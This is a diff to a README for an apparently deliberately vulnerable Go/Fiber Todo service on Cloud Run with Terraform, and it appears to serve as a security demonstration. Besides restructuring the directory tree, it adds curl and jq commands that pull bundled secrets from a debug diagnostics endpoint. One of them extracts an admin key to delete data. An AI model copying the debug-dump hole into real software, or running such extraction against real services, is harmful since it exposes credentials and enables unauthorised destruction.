@@ -23,13 +23,15 @@
 ```text
 .
 ├── application/             # Go 1.26 + Fiber v3 Todo service
-│   ├── main.go              # REST API logic and diagnostics
-│   ├── go.mod               # Dependencies (fiber v3.3.0)
-│   ├── go.sum
+│   ├── main.go              # Service entrypoint & HTTP server
+│   ├── internal/            # Decoupled packages (config, handler, model, store)
+│   ├── go.mod / go.sum      # Dependencies (fiber v3.3.0)
 │   ├── Dockerfile           # Container build definition
 │   └── README.md            # Local application setup & test guide
 ├── infrastructure/          # Terraform configurations
-│   ├── main.tf              # Provider, APIs, and Artifact Registry
+│   ├── main.tf              # Terraform requirements & Google provider
+│   ├── services.tf          # Required Google Cloud APIs
+│   ├── artifact_registry.tf # Artifact Registry repository
 │   ├── service_account.tf   # Custom service account & IAM bindings
 │   ├── secrets.tf           # Secret Manager configuration
 │   ├── cloud_run.tf         # Cloud Run service definition
@@ -169,12 +171,15 @@ curl -i "$SERVICE_URL/api/v1/todos"
 Because `DEBUG=true` is enabled in the staging deployment, the internal diagnostic endpoint dumps all environment variables, including `APP_CONFIG_SECRETS`:
 ```bash
 curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq .
+
+# Inspect the bundled secret JSON (exposes DB credentials, JWT signing key, admin API key, SaaS tokens)
+curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq -r '.environment_variables.APP_CONFIG_SECRETS | fromjson'
 ```
 
 ### 4. Delete an Item with the Leaked Admin Key
-Extract the key from the diagnostics endpoint and issue an administrative delete:
+Extract the admin API key from the bundled secrets and issue an administrative delete:
 ```bash
-KEY=$(curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq -r '.environment_variables.TODO_ADMIN_KEY')
+KEY=$(curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq -r '.environment_variables.APP_CONFIG_SECRETS | fromjson | .admin_api_key')
 
 curl -i -X DELETE "$SERVICE_URL/api/v1/todos/1" \
   -H "X-Admin-Key: $KEY"
